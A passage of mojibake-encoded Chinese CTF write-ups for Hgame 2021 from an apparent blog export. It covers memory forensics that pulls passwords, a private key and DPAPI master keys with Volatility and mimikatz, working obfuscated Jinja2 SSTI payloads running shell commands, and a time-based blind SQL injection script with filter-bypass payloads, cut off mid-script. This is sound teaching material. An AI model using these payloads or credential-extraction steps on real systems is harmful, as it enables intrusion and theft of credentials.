0xfffff88004a40000L KPCR for CPU 13 : 0xfffff88004abd000L KPCR for CPU 14 : 0xfffff88004b3a000L KPCR for CPU 15 : 0xfffff88004bb7000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2021-02-19 08:23:04 UTC+0000 Image local date and time : 2021-02-19 16:23:04 +0800 è¯»å–å¹¶æå–æ–‡ä»¶ $ volatility -f secret_work.raw --profile=Win7SP1x64 filescan | grep Desktop Volatility Foundation Volatility Framework 2.6 0x000000003ef28430 1 1 RW-rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\HGAME2021-20210219-082257.raw 0x000000003f260a80 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000007ec7a070 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\desktop.ini 0x000000007ec7d070 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop\\desktop.ini 0x000000007ec9af20 12 0 R--r-d \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\DumpIt.exe 0x000000007ec9ba70 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x000000007ec9c370 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\Desktop.ini 0x000000007ec9d070 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Accessibility\\Desktop.ini 0x000000007ec9e8c0 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x000000007eca1820 2 0 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\Google Chrome.lnk 0x000000007eca1970 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\Desktop.ini 0x000000007eca1c80 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\System Tools\\Desktop.ini 0x000000007eca4f20 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Games\\Desktop.ini 0x000000007eca5970 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\System Tools\\Desktop.ini 0x000000007eca6070 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Accessibility\\Desktop.ini 0x000000007ecb7e20 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Tablet PC\\Desktop.ini 0x000000007ed64800 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000007ed70340 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop 0x000000007ed715a0 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop 0x000000007ef94820 2 0 RW-r-- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\dumpme.txt 0x000000007f416f20 10 0 R--r-d \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\DumpIt.exe 0x000000007f418a30 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000007f7d08f0 2 0 R--rw- \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Remote Desktop Connection.lnk 0x000000007fc28dd0 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop $ volatility -f secret_work.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007ef94820 --dump-dir=./ -u dumpme.txt zip password is: 5trqES&amp;P43#y&amp;1TO And you may need LastPass è§£å‹ secret.7z å¾—åˆ° S- å¼€å¤´çš„é‚£ç©æ„æ€ä¹ˆçœ‹éƒ½åƒæ˜¯å›æ”¶ç«™ï¼ˆ ç”¨ LastPass å¾—åˆ°ç™»å½•å¯†ç ã€‚ https://github.com/kevthehermit/volatility_plugins/tree/master/lastpass git clone ä¸‹æ¥ï¼Œç„¶åç”¨ --plugins= æŒ‡å®šè·¯å¾„ã€‚ $ volatility --plugins=/home/miaotony/CTF/Tools/volatility_plugins/lastpass -f secret_work.raw --profile=Win7SP1x64 lastpass Volatility Foundation Volatility Framework 2.6 Searching for LastPass Signatures Found pattern in Process: chrome.exe (3948) Found pattern in Process: chrome.exe (3948) Found pattern in Process: chrome.exe (3948) Found pattern in Process: chrome.exe (3948) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (2916) Found pattern in Process: chrome.exe (1160) Found pattern in Process: chrome.exe (1160) Found pattern in Process: chrome.exe (1160) Found pattern in Process: chrome.exe (1160) Found LastPass Entry for live.com UserName: windows login &amp; miscrosoft Pasword: Unknown Found LastPass Entry for live.com,bing.com,hotmail.com,live.com,microsoft.com,msn.com,windows.com,windowsazure.com,office.com,skype.com,azure.com UserName: windows login &amp; miscrosoft Pasword: vIg*q3x6GFa5aFBA Found Private Key LastPassPrivateKey&lt;308204BB020100300D06092A864886F70D0101010500048204A5308204A10201000282010100BF794F57D296731F67FD1007BEB13A7732DE75CEB688A0A0B8A4C9DE5D0757E83F9CE8EED14346977C72C65F2C2834F150D9FB54086531896CDEFD6D8F4A5CCA2D39E0ADCB24AA6EE075579E9C6631588E9474F6B91B9D1D4D23E55442FA4E89D6810A764CCCEB224DB045DE8E9B17D3A0E561F96D4F414E775A76EA74031AB0EDAB640D1D5FFB8B83F7F7F0CA2D415F9E68CB9DB1AB6028012724AE5674FCC5C0C6085FD2A5C39E785E36C899166120893095779104A123090681914834E063FD433E0F54A221BFA6B344F76B270D1FB5FBC5A7385911A0222A65FD7FDA3573F1A9C8C8B75003664DC998FB6BAB048D65F0A44A23E1446E299A4323280A13ED020111028201000B435F052A815210E7FFD3C43864C734302B341B37E9EB54BF91390D1487F61CB872A44A488B7C9F7FCA8423B74DA8C2E6A369230F8D7B626FD0E1BB268BE7572FD63A64937AA09D1C43234590BAB79BCC26D9B429019FD48C112B9B8B7822BCD061F18E7CFCFEC5C855A9C1CC273DA30976E7A542AA4F22BBBA06FEBB87B6468A44BD7E57DA570AB63E1A013AD75AC3B6B3927D274769E4774B7DC66DC10CA337465A39221C062B9B96BF4E8BF484C3F171A40E41B6D32FC417E0A54EFEE8896346947F7CB40B382F2D8AB78D6CD040570FAC76C0497CC3A677B884B6208157E482D42B0CD675C7F52F50AAA221C076F2604475B4A3F766B9B0103DA11633ED02818100FE8270E2DD0E11837ECDE3E61EED958F59F0FC906A46082A9C38ED503968174F233CC4A7E95F1DF125CEDAAF56A374B986883CFD803FCE883378DCBB43EBDBB631E6069D3151572368206134BB850E3B47638C8E5CB4F4A742D30D87876BB76ACEEA9A0EEB6BB5301A5E730C976F660693BA37E9A73F66140F3EE3E6058687B702818100C0985DC66AD22251EB0A59F5C2F2A4D1228B14BDABA74FD178EADD30D33B0E9FF1DD45ECA56A3CC7FD8CA7E1F7361B63FA1C7387B3A0CC6ECFF7B9DBC55B938E33AD5AFADB5C0BE11C8CAD924B682A9EA68DC53616C2D3FAD16417A5E045E732F60F17DDF1A67BEEEB46CA9A0FFDD6A0B9D1E08F7DBE7087C5AA4B25700A197B0281801DF13A750AF298A60EEB0BC0B8582FB6830D4AE3D044796E6CBB67369D578A458BACCBD784DE0385C8367414A0C7EF9D5B1F163BF0F872A69CA4CEAC9E9437F7512A1EE55118A0D6FD30FC608E881FCABD1AC53DECC9FEAA4418D46A4C2ACA48CD0C8A9857EE8DC96C8395108A49574C116133C122BC2A207A43A2574BF1B59D0281805AA20E03051797AE14411B4679DB98DAE31445FEE75DCB3566142BDABDC1704B44A45D24119B67E5A47E6D1F0AEC491FFD3A90B85487E7BBAD2948676BEEDC06AEE82AD0673A5FF176D8CA26BA12E6E13F51C637923D90EE80A792A8698A4EAE91E8FC2C357B859D9BE5140C43C2BF5AB1CC2D70B3A4E9A94DF5C9028F13CFC102818100AAFE94334DE0035FE8673623497290B5D059E6176FB785D83A2EA157C2E3B335E2E264DC5D7EBB73E0348E7578D956F1AF59E81D9FC24FFB23A61B262184A0B06B4A0F79A750E0EFE776646CFF6ACDB2A2A4CFFBDEC64DA06F05A76A8028CC3E0D487A21C4EADA734DADEDC8280528892E07FBC98DC47B0E2ED1E69EDA479D05&gt;LastPassPrivateKey å¾—åˆ° ç³»ç»Ÿç™»å½•å¯†ç  vIg*q3x6GFa5aFBAã€‚ çœ‹åˆ°æœ‰ä¸ª Cookiesï¼Œå‘ç°æ˜¯ Sqlite æ•°æ®åº“ï¼Œæ˜¯ Chrome å­˜æ”¾ Cookie çš„ã€‚ åˆå‘ç°æ–‡ä»¶ç»“å°¾ æœ‰ä¸ª localhostVeraCrypt/ æŸ¥äº†ä¸€ä¸‹ï¼ŒVeraCrypt æ˜¯ä¸€ç§ç¡¬ç›˜åŠ å¯†å·¥å…·ï¼Œç›²çŒœ container æ–‡ä»¶å°±æ˜¯è¢«åŠ å¯†çš„é•œåƒäº†ã€‚ ç”¨ mimikatz å»è§£å¯† Cookiesï¼Œå‘ç°éœ€è¦ Masterkeyã€‚ mimikatz ï¼ˆåæ¸—é€å·¥å…·ï¼Œä»…åœ¨ Windows ä¸‹ä½¿ç”¨ https://github.com/gentilkiwi/mimikatz mimikatz(commandline) # dpapi::chrome /in:secret\\Cookies /unprotect Host : localhost ( / ) Name : VeraCrypt Dates : 2021/2/19 14:08:59 -&gt; 2022/2/19 14:00:00 * using CryptUnprotectData API ERROR kuhl_m_dpapi_unprotect_raw_or_blob ; NTE_BAD_KEY_STATE, needed Masterkey is: {57935170-beab-4565-ba79-2b09570b95a6} è¿™ä¸ªéœ€è¦çš„ Masterkey æ­£å¥½å°±å’Œ S- å¼€å¤´çš„æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶ååŒåã€‚ ç„¶åæŸ¥äº†ä¸€å †èµ„æ–™ï¼ˆ å‚è€ƒï¼š Mimikatzä¹‹DPAPIå­¦ä¹ ä¸å®è·µ Operational Guidance for Offensive User DPAPI Abuse [ç¿»è¯‘]æ»¥ç”¨User DPAPIè¿›è¡Œæ”»å‡»çš„æ“ä½œæŒ‡å—ï¼ˆä¸Šé¢é‚£ç¯‡çš„ç¿»è¯‘ï¼‰ é€šè¿‡Dpapiè·å–Windowsèº«ä»½å‡­è¯ åæ¸—é€æ”»é˜²çš„ä¿¡æ¯æ”¶é›† ç”¨ç³»ç»Ÿç™»å½•å¯†ç å»æ±‚è§£ Masterkeyã€‚ mimikatz(commandline) # dpapi::masterkey /in:secret\\S-1-5-21-262715442-3761430816-2198621988-1001\\57935170-beab-4565-ba79-2b09570b95a6 /password:vIg*q3x6GFa5aFBA **MASTERKEYS** dwVersion : 00000002 - 2 szGuid : {57935170-beab-4565-ba79-2b09570b95a6} dwFlags : 00000005 - 5 dwMasterKeyLen : 000000b0 - 176 dwBackupKeyLen : 00000090 - 144 dwCredHistLen : 00000014 - 20 dwDomainKeyLen : 00000000 - 0 [masterkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 0b6b5eb5eee1d3cc68d5e415cd3e4419 rounds : 000043f8 - 17400 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : e3d3a53699471473f53c2316e39b0276941fb3599f5931ec3dd1ff5dfdd7c528b9c2b0a05e5eb7d070b9035eceb7788fb43994bc43ccd68d2a5b05708366de098e8b4e77780cc5296608e628173e826973f2124fe1f4dbf71a5485cc31e537056cae79ad95b461f1c881d268194731ccb14d33148885c7d9244c88ae1a8ee150adc74c6ab5a67ea87b6fe4bd8f6cd9ac [backupkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 5e0428d80b0c876b249bbf53fe5d8ea8 rounds : 000043f8 - 17400 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : 7f5d3f666c489f4be5bb1784bbe140cd0c764267b3ec33760522a97e6282f98f1192fee7030a70728bb0b96196557dca96fb89edad1bf13deb5d5cf9fc1946cdd71cefc7aa42468e9f4ce64e5f04f84ce98b729316f65bac9534e913178dc7b8e0d6b2900c39b0bb911eeff84622cd9c [credhist] **CREDHIST INFO** dwVersion : 00000003 - 3 guid : {24465cc4-8981-41cc-b3ae-ff825294bce1} Auto SID from path seems to be: S-1-5-21-262715442-3761430816-2198621988-1001 [masterkey] with password: vIg*q3x6GFa5aFBA (normal user) key : 3cafd3d8e6a67edf67e6fa0ca0464a031949182b3e68d72ce9c08e22d7a720b5d2a768417291a28fb79c6def7d068f84955e774e87e37c6b0b669e05fb7eb6f8 sha1: 8fc9b889a47a7216d5b39c87f8192d84a9eb8c57 ç„¶åå†ç”¨è¿™ä¸ª Masterkey è§£å¼€ Cookieã€‚ key/sha1 éƒ½è¡Œã€‚ mimikatz(commandline) # dpapi::chrome /in:secret\\Cookies /masterkey:8fc9b889a47a7216d5b39c87f8192d84a9eb8c57 /unprotect Host : localhost ( / ) Name : VeraCrypt Dates : 2021/2/19 14:08:59 -&gt; 2022/2/19 14:00:00 * using CryptUnprotectData API * masterkey : 8fc9b889a47a7216d5b39c87f8192d84a9eb8c57 Cookie: !bWjAqM2z!iSoJsV*&amp;IRV@*AVI1VrtAb å¾—åˆ° VeraCrypt å¯†é’¥ !bWjAqM2z!iSoJsV*&amp;IRV@*AVI1VrtAbã€‚ https://www.veracrypt.fr/en/Downloads.html æŒ‚è½½ container NTFS æ–‡ä»¶æµéšå†™ å‚è€ƒä¹‹å‰å†™çš„ å…³äº NTFS ADS çš„ä¸€äº›æ€»ç»“ hgame{Which_0nly_cryin9_3yes_c4n_de5cribe} And you may be intertested in this bonus: https://eyes.hgame2021.cf å¥½å¥—å¨ƒå•Šï¼ å“‡ï¼ï¼ï¼åŸæ¥ä½ ä»¬æ¸—é€éƒ½è¿™ä¹ˆä¼šç©çš„ä¹ˆï¼ BTWï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œè¿™é¢˜æœ‰ç‚¹åƒ 2019 å›½é™…èµ› De1CTF DeepInRealï¼Œå‚è€ƒé¢˜è§£ã€‚ å°ç»“å–µå‘œï¼ Hgame 2021 å®Œç»“æ’’èŠ±ï¼ å¥½è€¶ï¼Œæ€»æ¦œç¬¬ 20ï¼Œæ²¡æ‰å‡ºç¬¬ä¸€é¡µï¼ˆçˆ¬èµ° ä»Šå¹´å¥½éš¾å¾—åšæŒæ¯å‘¨éƒ½æ¥çœ‹é¢˜ç›®äº† 233. ç©çš„è¿˜ç®—å¼€å¿ƒï¼Œå°±æ˜¯æœ‰ç‚¹å¤´ç§ƒã€‚ æ­ç”µçš„å‡ºé¢˜å¸¦å¸ˆå‚…ä»¬ä¹Ÿè¾›è‹¦äº†ã€‚ï¼ˆè¿™å°±å»æ‰“å‡ºé¢˜äºº ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/03/04/CTF_2021HgameWeek4/"},{"title":"CTF | 2021 Hgame Week3 WriteUp","text":"å¼•è¨€Hgame 2021 Week 3 å–µå‘œå‘œï¼Œç¬¬ä¸‰å‘¨å¥½éš¾å•Šï¼ è¿™å‘¨è¿‡å¹´æ¯”è¾ƒå¿™ï¼Œå°±éšæ„çœ‹äº†çœ‹å§ã€‚ WebForgetful Liki æ€»æ˜¯å¿˜è®°å¾ˆå¤šäº‹æƒ…ï¼Œäºæ˜¯å¥¹çµæœºä¸€åŠ¨ï¼Œç”¨æ–°å­¦ä¼šçš„ Python å†™äº†ä¸€ä¸ª TodoListï¼Œå¿«ç”¨èµ·æ¥å§ï¼ https://todolist.liki.link/ æŸ¥çœ‹ é¡µé¢å­˜åœ¨ SSTI. Payload: {{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"ls -al /\")[\"read\"]()}} total 104 drwxr-xr-x 1 root root 4096 Feb 11 16:13 . drwxr-xr-x 1 root root 4096 Feb 11 16:13 .. drwxr-xr-x 5 root root 4096 Feb 13 13:59 app drwxr-xr-x 1 root root 4096 Jun 4 2020 bd_build drwxr-xr-x 1 root root 4096 Jun 4 2020 bin drwxr-xr-x 2 root root 4096 Apr 24 2018 boot drwxr-xr-x 5 root root 340 Feb 14 14:00 dev -rwxr-xr-x 1 root root 0 Feb 11 16:13 .dockerenv drwxr-xr-x 1 root root 4096 Feb 13 14:48 etc -rw-r--r-- 1 root root 38 Feb 11 16:12 flag drwxr-xr-x 1 root root 4096 Feb 11 16:12 home drwxr-xr-x 1 root root 4096 Feb 11 16:12 lib drwxr-xr-x 1 root root 4096 Feb 11 16:12 lib64 drwxr-xr-x 2 root root 4096 Apr 3 2020 media drwxr-xr-x 2 root root 4096 Apr 3 2020 mnt drwxr-xr-x 2 root root 4096 Apr 3 2020 opt dr-xr-xr-x 217 root root 0 Feb 14 14:00 proc -rw-r--r-- 1 root root 122 Feb 11 15:10 requirements.txt drwx------ 1 root root 4096 Feb 11 16:12 root drwxr-xr-x 1 root root 4096 Jun 4 2020 run drwxr-xr-x 1 root root 4096 Jun 4 2020 sbin drwxr-xr-x 2 root root 4096 Apr 3 2020 srv dr-xr-xr-x 13 root root 0 Feb 13 12:31 sys drwxrwxrwt 1 root root 4096 Feb 14 11:40 tmp drwxr-xr-x 1 root root 4096 Apr 3 2020 usr drwxr-xr-x 1 root root 4096 Apr 3 2020 var ä½†æ˜¯å‘ç°è¯»ä¸äº†æ ¹ç›®å½•çš„ flagï¼Œå‘ç° bash æˆ–è€… nc ä¹Ÿåå¼¹ä¸äº† shellï¼Œemmm ç„¶åè¯•äº† wc -l /flag å‘ç°å¹¶æ²¡æœ‰è¢«æ‹¦ï¼Œå…¶ä»–æ–‡ä»¶ä¹Ÿèƒ½è¯»ã€‚ï¼ˆæ²¡è¿‡æ»¤ flag cat æ‰€ä»¥æ¨æµ‹æ˜¯ è¾“å‡ºçš„å­—ç¬¦ä¸²ä¸­å¦‚æœå‡ºç°å…³é”®å­—åˆ™æ‹¦æˆªã€‚ è¯•è¯•å‘ç°ä»åå¾€å‰è¯»å¯ä»¥ï¼Œæœ€ç»ˆ payloadï¼š {{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"tail -c 35 /flag\")[\"read\"]()}} æˆ–è€… cat /flag|base64 ä¹Ÿè¡Œã€‚ hgame{h0w_4bou7+L3arn!ng~PythOn^Now?} æ°”æ­»æˆ‘äº†ï¼Œè¿™å°±å»è¯»æºç ã€‚ {{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"ls -al\")[\"read\"]()}} total 40 drwxr-xr-x 5 root root 4096 Feb 13 13:59 . drwxr-xr-x 1 root root 4096 Feb 11 16:13 .. -rw-r--r-- 1 root root 5255 Feb 13 13:59 app.py -rw-r--r-- 1 root root 168 Feb 11 15:10 ext.py -rw-r--r-- 1 root root 945 Feb 11 15:10 forms.py -rw-r--r-- 1 root root 1048 Feb 11 15:10 models.py drwxr-xr-x 2 root root 4096 Feb 11 15:10 __pycache__ drwxr-xr-x 5 root root 4096 Feb 11 15:10 static drwxr-xr-x 2 root root 4096 Feb 11 15:10 templates app.py #!/usr/bin/python #-*- coding: UTF-8 -*- from __future__ import unicode_literals from flask import (Flask, render_template, redirect, url_for, request, flash) from jinja2 import Template from flask_bootstrap import Bootstrap from flask_login import login_required, login_user, logout_user, current_user from hashlib import md5 from forms import TodoListForm, LoginForm, RegisterForm from ext import db, login_manager from models import TodoList, User import pymysql pymysql.install_as_MySQLdb() SECRET_KEY = 'ssssssTiLIKISAMA' SALT = 'SIKILIKISAMA' app = Flask(__name__) bootstrap = Bootstrap(app) app.secret_key = SECRET_KEY app.config['SQLALCHEMY_DATABASE_URI'] = \"mysql://ctf:p45Sw0rdOfssti@ssti_database/todolist\" app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True db.init_app(app) login_manager.init_app(app) login_manager.login_view = \"login\" @app.route('/', methods=['GET', 'POST']) @login_required def show_todo_list(): form = TodoListForm() if request.method == 'GET': todolists = TodoList.query.filter_by(user_id=current_user.id) return render_template('index.html', todolists=todolists, form=form) else: if form.validate_on_submit(): todolist = TodoList(current_user.id, form.title.data, form.status.data) db.session.add(todolist) db.session.commit() flash('You have ADD a new todo list') else: flash(form.errors) return redirect(url_for('show_todo_list')) @app.route('/delete/&lt;int:id&gt;') @login_required def delete_todo_list(id): user_id = TodoList.query.filter_by(id=id).first_or_404().user_id if (user_id == current_user.id): todolist = TodoList.query.filter_by(id=id).first_or_404() db.session.delete(todolist) db.session.commit() flash('You have DELETE a todo list') else: flash('You DO NOT have permission to delete this todo') return redirect(url_for('show_todo_list')) @app.route('/view/&lt;int:id&gt;', methods=['GET']) @login_required def view_todo_list(id): user_id = TodoList.query.filter_by(id=id).first_or_404().user_id if (user_id == current_user.id): try: todo = TodoList.query.filter_by(id=id).first_or_404() s = render_template('view.html', todo=todo) s = s.replace(\"lza9veb5WmH367fcuUyn\", todo.title) t = Template(s) r = t.render() if (('hgame' in r) or ('emagh' in r)): r = 'Stop!!!' r = 'Stop!!!' return r except: flash(\"Something went wrong!\") else: flash('You DO NOT have permission to view this todo') return redirect(url_for('show_todo_list')) @app.route('/modify/&lt;int:id&gt;', methods=['GET', 'POST']) @login_required def modify_todo_list(id): user_id = TodoList.query.filter_by(id=id).first_or_404().user_id if (user_id == current_user.id): if request.method == 'GET': todolist = TodoList.query.filter_by(id=id).first_or_404() form = TodoListForm() form.title.data = todolist.title form.status.data = str(todolist.status) return render_template('modify.html', form=form) else: form = TodoListForm() if form.validate_on_submit(): todolist = TodoList.query.filter_by(id=id).first_or_404() todolist.title = form.title.data todolist.status = form.status.data db.session.commit() flash('You have MODIFY a todolist') else: flash(form.errors) else: flash('You DO NOT have permission to modify this todo') return redirect(url_for('show_todo_list')) @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': pswd = md5((request.form['password'] + SALT).encode(encoding='UTF-8')).hexdigest() print(pswd) user = User.query.filter_by(username=request.form['username'], password=pswd).first() if user: login_user(user) flash('You have logged in!') return redirect(url_for('show_todo_list')) else: flash('Invalid username or password') form = LoginForm() return render_template('login.html', form=form) @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': pswd = md5((request.form['password'] + SALT).encode(encoding='UTF-8')).hexdigest() print(pswd) newuser = User(username=request.form['username'], password=pswd) user = db.session.add(newuser) try: db.session.commit() flash('You have registered!') return redirect(url_for('login')) except: flash('Username Exists') form = RegisterForm() return render_template('register.html', form=form) @app.route('/logout') @login_required def logout(): logout_user() flash('You have logout!') return redirect(url_for('login')) @login_manager.user_loader def load_user(user_id): return User.query.filter_by(id=int(user_id)).first() if __name__ == '__main__': app.run(host='0.0.0.0', port=5000, debug=False) æœç„¶æ˜¯æ£€æŸ¥æ¸²æŸ“åçš„ç»“æœé‡Œæ˜¯å¦æœ‰ hgame æˆ–è€… emaghï¼Œæœ‰çš„è¯å°±ç›´æ¥è¿”å› Stop!!!ã€‚ å±…ç„¶æœ‰ä¸ª MySQL æ•°æ®åº“ï¼Œå˜¿å˜¿ä¿¡æ¯éƒ½æœ‰äº†ã€‚ Liki-Jail æ¼«é•¿çš„è¿½æ•ç»“æŸäº†ï¼Œä½œæ¶å¤šç«¯çš„ Switch è¢«è­¦å®˜ Liki æ‰æ‹¿å½’æ¡ˆï¼Œå…³æŠ¼åœ¨ç¦»å¥‡ç›‘ç‹± ä¸è¿‡ Switch å¥½åƒæœ‰ç€ä¸å¯å‘Šäººçš„ç§˜å¯†ï¼Œæœ‰ç€å¿…é¡»è¦å®Œæˆçš„äº‹æƒ…ï¼Œä»–å¿…é¡»è¦é€ƒç¦»ç›‘ç‹± ä¸å·§çš„æ˜¯ç›‘ç‹±ç®¡ç†ç³»ç»Ÿåˆšå¥½æ­£åœ¨ç»´æŠ¤ï¼Œåªæœ‰ç®¡ç†å‘˜å¯ä»¥ç™»å½•ç³»ç»Ÿï¼Œè¯¥æ€ä¹ˆåŠå‘¢â€¦â€¦ https://jailbreak.liki.link/ è¿‡æ»¤äº† ç©ºæ ¼ - ' \" = ç”¨ \\ è½¬ä¹‰æ‰å¼•å·ï¼Œè¯•äº†è¯• username=\\, password=/**/Or/**/sleep(10)# æœç„¶èƒ½å¤Ÿ sleepã€‚ äºæ˜¯å°±æ˜¯ åŸºäºæ—¶é—´çš„ç›²æ³¨ äº†ã€‚ ç„¶ååˆæ˜¯ SQL æ³¨å…¥ç¯èŠ‚ã€‚ Exp: æ³¨æ„ Content-Type è¦åŠ ä¸Š application/x-www-form-urlencodedï¼Œä¸ç„¶ä¹ˆå¾—ååº”ã€‚ = ç”¨ like ç»•è¿‡ï¼Œä½†æ˜¯ like é»˜è®¤ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥éœ€è¦ like binary. ç©ºæ ¼ç”¨ /**/ ç»•è¿‡ã€‚ MySQL é‡Œå«æœ‰ç‰¹æ®Šå­—ç¬¦å¯ä»¥ç”¨ åå¼•å·åŒ…èµ·æ¥ï¼Œå¦‚ (`blal@b@la`)ã€‚ # coding: utf-8 \"\"\" æ—¶é—´ç›²æ³¨è„šæœ¬ MiaoTony \"\"\" import requests import time from urllib.parse import urlencode header = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0\", \"Referer\": \"https://jailbreak.liki.link/\", \"Host\": \"jailbreak.liki.link\", \"Content-Type\": \"application/x-www-form-urlencoded\" } def get_len(password: str): # è·å–æ•°æ®åº“é•¿åº¦ print(\"start get length...\") url = \"https://jailbreak.liki.link/login.php\" for i in range(1, 30): payload = {} payload[\"username\"] = \"\\\\\" payload[\"password\"] = password.format(i=i) payload = urlencode(payload) # print(payload) startTime = time.time() r = requests.post(url, data=payload, headers=header) r.encoding = 'utf-8' # print(r.text) if time.time() - startTime &gt;= 1: break print(\"length:\", i) def get_name(password: str, length: int): # è·å–æ•°æ®åº“å url = \"https://jailbreak.liki.link/login.php\" name = '' for j in range(1, length + 1): for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%': print(i, '...') s = hex(ord(i)) payload = {} payload[\"username\"] = \"\\\\\" payload[\"password\"] = password.format(j=j, s=s) payload = urlencode(payload) # print(payload) # payload = r\"username=%5C&amp;password=%2F**%2FoR%2F**%2Fif%28length%28database%28%29%29likE%2F**%2F9%2Csleep%283%29%2C1%29%23\" startTime = time.time() r = requests.post(url, data=payload, headers=header) r.encoding = 'utf-8' # print(r.text) if time.time() - startTime &gt;= 1: name += i print('====&gt;', name) break print('name:', name) def main(): # db_len = \"/**/oR/**/if(length(database())likE/**/{i},sleep(1),1)#\" # get_len(db_len) # # 9 # db_name = \"/**/oR/**/if(substr(database(),{j},1)liKe/**/{s},sleep(1),1)#\" # get_name(db_name, 9) # # week3sqli # table_len = \"/**/oR/**/if((seleCt/**/lenGth(table_name)liKe/**/{i}/**/fRom/**/information_schema.tables/**/wHere/**/table_schema/**/liKe/**/database()/**/limit/**/0,1),sleep(1),1)#\" # get_len(table_len) # # 5 # table_name = \"/**/oR/**/if((seLect/**/subStr(table_name,{j},1)liKe/**/{s}/**/fRom/**/information_schema.tables/**/wHere/**/table_schema/**/liKe/**/database()/**/limIt/**/0,1),sleep(1),1)#\" # get_name(table_name, 5) # # u5ers # column_len = \"/**/oR/**/if((seleCt/**/lenGth(column_name)liKe/**/{i}/**/fRom/**/information_schema.columns/**/wHere/**/table_name/**/liKe/**/0x7535657273/**/limit/**/0,1),sleep(1),1)#\" # get_len(column_len) # # 8 # column_name = \"/**/oR/**/if((seLect/**/subStr(column_name,{j},1)liKe/**/{s}/**/fRom/**/information_schema.columns/**/wHere/**/table_name/**/liKe/**/0x7535657273/**/limIt/**/1,1),sleep(1),1)#\" # get_name(column_name, 8) # # usern@me, p@ssword # username_len = 